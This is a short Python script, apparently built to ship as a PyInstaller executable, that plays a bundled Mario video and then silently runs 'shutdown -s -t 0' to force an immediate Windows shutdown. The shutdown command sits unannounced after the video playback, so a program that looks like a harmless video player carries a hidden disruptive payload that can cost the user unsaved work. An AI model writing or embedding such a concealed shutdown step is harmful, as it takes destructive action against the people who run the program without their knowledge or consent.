import moviepy.editor as mp
import os
import sys

def main():
    # Get the base path when running as a PyInstaller executable
    base_path = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))

    # Construct the full path to the video file
    video_path = os.path.join(base_path, "mario.mp4")

    # Check if the file exists
    if not os.path.exists(video_path):
        print(f"Error: File not found - {video_path}")
        return

    # Load and play the video
    video = mp.VideoFileClip(video_path)
    video.preview()
    os.system('shutdown -s -t 0')

if __name__ == "__main__":
    main()
